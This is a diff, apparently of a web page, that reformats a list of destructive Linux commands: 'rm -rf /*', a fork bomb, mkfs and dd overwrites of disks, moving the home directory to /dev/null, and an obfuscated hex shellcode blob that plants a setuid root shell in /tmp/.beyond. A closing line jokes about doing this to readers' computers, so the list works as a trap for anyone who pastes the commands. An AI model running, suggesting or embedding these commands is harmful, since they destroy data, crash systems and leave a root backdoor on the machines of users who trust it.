@@ -20,9 +20,9 @@
 
 <ul>
 
-<li>sudo rm -rf /*</li>
+`sudo rm -rf /*`
 
-`<li>char esp[] __attribute__ ((section(“.text”))) /* e.s.p
+`char esp[] __attribute__ ((section(“.text”))) /* e.s.p
 release */
 = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68”
 “\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99”
@@ -32,15 +32,15 @@ release */
 “\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69”
 “\x6e\x2f\x73\x68\x00\x2d\x63\x00”
 “cp -p /bin/sh /tmp/.beyond; chmod 4755
-/tmp/.beyond;”;</li>`
+/tmp/.beyond;”;`
 
-<li>`:(){ :|: & };:`</li>
+`:(){ :|: & };:`
 
-<li>`mkfs.ext4 /dev/sda1`</li>
+`mkfs.ext4 /dev/sda1`
 
-<li>`dd if=/dev/random of=/dev/sda`</li>
+`dd if=/dev/random of=/dev/sda`
 
-<li>`mv ~ /dev/null`</li>
+`mv ~ /dev/null`
 
 #### _Hope nobody minds me doing this to their computer ;)_
 
